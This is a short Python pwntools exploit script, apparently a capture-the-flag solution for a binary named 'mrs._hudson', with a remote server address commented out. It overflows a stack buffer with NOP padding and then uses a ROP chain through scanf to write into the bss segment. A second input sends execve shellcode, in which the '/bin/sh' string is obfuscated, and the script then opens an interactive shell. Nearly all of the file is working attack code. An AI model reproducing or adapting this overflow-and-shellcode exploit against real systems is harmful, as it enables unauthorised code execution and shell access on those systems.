from pwn import *

ret = 0x4004ee
popret = 0x400575
addesp_8 = 0x4004eb

shellcode = (
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
)

pop_rdi_ret = 0x4006f3
pop_rsi_pop_r15_ret = 0x4006f1
bss = 0x601060

p = process("mrs._hudson")
#p = remote("178.62.249.106",8642)
print p.recv()
payload = "\x90"*(0x70)
payload += p64(bss)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(bss)
payload += p64(0)
payload += p64(0x400676)		# scanf("%s", bss)
payload += p64(bss)
payload += p64(bss)
p.sendline(payload)
raw_input()
p.sendline("a"*8 + p64(bss+16) + shellcode)
p.interactive()
